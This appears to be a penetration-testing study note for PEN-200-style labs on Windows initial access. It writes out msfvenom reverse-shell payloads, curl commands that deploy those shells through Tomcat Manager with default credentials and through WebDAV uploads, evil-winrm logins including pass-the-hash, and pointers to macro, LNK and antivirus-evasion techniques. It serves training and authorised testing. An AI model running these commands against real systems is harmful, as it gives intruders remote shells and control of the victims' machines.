# Windows Initial Access

## EternalBlue MS17-010

```bash
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
```

Checks whether SMB on port **445** appears vulnerable to **MS17-010 / EternalBlue**. This is a vulnerability check, not exploitation.

## Tomcat Manager WAR Deploy

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
```

Creates a **WAR web application** containing a JSP reverse shell that connects back to your Kali machine.

```bash
curl -u admin:admin -T shell.war "http://<IP>:8080/manager/text/deploy?path=/shell"
```

Authenticates to Tomcat Manager with `admin:admin` and uploads/deploys the WAR as the `/shell` application.

```bash
curl http://<IP>:8080/shell/
```

Requests the deployed application, triggering the reverse-shell payload. You would normally have a listener running on port `4444`.

## WebDAV

```bash
davtest -url http://<TARGET_IP>
```

Tests the WebDAV server to determine which methods and file types are allowed, especially whether files can be **uploaded and executed**.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
```

Generates a **64-bit Windows reverse shell** wrapped in an ASPX page for an IIS target.

```bash
curl -T shell.aspx http://<TARGET_IP>/uploads/shell.aspx
```

Uploads the ASPX payload to the target. Browse to the uploaded file afterward to trigger it, assuming ASPX execution is permitted.

## WinRM

```bash
evil-winrm -i <TARGET_IP> -u Administrator -p 'Password123'
```

Opens a remote PowerShell session over **WinRM** using a username and plaintext password.

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
```

Opens a remote PowerShell session using an **NTLM hash instead of the plaintext password** (Pass-the-Hash).

## Quick Mental Model

**MS17-010 = SMB vulnerability → Tomcat/WebDAV = upload + execute → WinRM = valid credentials/hash → shell**


## Client-Side / User-Interaction Initial Access

When the Windows client is internal/non-routable or exposed services do not provide the foothold, PEN-200 Chapter 11 adds a **user-interaction** path:

```text
recon user + OS + installed software
        ↓
[[StandAloneBoxes/Standalone Win Box Methodology/Client-Side Attacks/Client-Side Attack Workflow|Client-Side Attack Workflow]]
        ├─ [[StandAloneBoxes/Standalone Win Box Methodology/Client-Side Attacks/Microsoft Office Macros|Microsoft Office Macros]]
        └─ [[StandAloneBoxes/Standalone Win Box Methodology/Client-Side Attacks/Windows Library-ms + LNK|Windows Library-ms → WebDAV → LNK]]
        ↓
reverse shell / Windows foothold
```

Treat this as an alternative **initial-access** route, not a replacement for network-service enumeration.


## Payload blocked by Antivirus

If a Windows payload is created/transferred correctly but the target AV blocks or quarantines it, branch into the Chapter 12 workflow instead of repeatedly regenerating random payloads:

```text
payload blocked / quarantined
        ↓
[[StandAloneBoxes/Standalone Win Box Methodology/Antivirus Evasion/AV Evasion Workflow|Antivirus Evasion Workflow]]
        ├─ understand/test the target AV
        ├─ on-disk or in-memory approach
        ├─ PowerShell thread injection
        └─ Shellter automated PE injection
        ↓
reverse shell / foothold
```

Remember: bypassing file-based AV detection does **not** guarantee the activity is invisible to EDR/behavioral monitoring.
